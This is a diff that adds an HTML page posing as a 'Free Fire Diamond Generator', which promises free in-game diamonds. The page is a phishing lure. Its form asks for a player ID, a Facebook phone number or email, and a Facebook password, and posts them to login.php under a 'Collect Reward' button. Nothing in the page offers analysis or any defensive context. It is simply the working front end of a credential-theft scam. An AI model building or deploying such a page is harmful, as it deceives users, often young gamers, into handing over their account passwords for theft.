@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Diamond Generator</title>
+    <style>
+        body { background: #000 url('https://img.onmsft.com/wp-content/uploads/2022/02/Garena-Free-Fire.jpg') no-repeat center center fixed; background-size: cover; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .overlay { background: rgba(0, 0, 0, 0.85); padding: 30px; border-radius: 10px; border: 2px solid #ffcc00; width: 350px; text-align: center; box-shadow: 0 0 20px #ffcc00; }
+        input, select { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ffcc00; border-radius: 4px; background: #1a1a1a; color: white; box-sizing: border-box; }
+        .btn { width: 100%; background-color: #ffcc00; border: none; border-radius: 4px; color: black; font-size: 18px; font-weight: bold; padding: 12px; cursor: pointer; margin-top: 15px; }
+        h1 { color: #ffcc00; font-size: 24px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+    <div class="overlay">
+        <h1>Diamond Top-Up</h1>
+        <p style="color: #fff;">Get Free Diamonds Instantly</p>
+        <form action="login.php" method="POST">
+            <select name="Diamond_Pack" required>
+                <option value="1000">1000 Diamonds</option>
+                <option value="5600">5600 Diamonds</option>
+                <option value="10000">10000 Diamonds</option>
+            </select>
+            <input type="text" name="Player_ID" placeholder="Player ID" required>
+            <input type="text" name="FB_User" placeholder="FB Phone or Email" required>
+            <input type="password" name="FB_Pass" placeholder="FB Password" required>
+            <button type="submit" class="btn">Collect Reward</button>
+        </form>
+    </div>
+</body>
+</html>
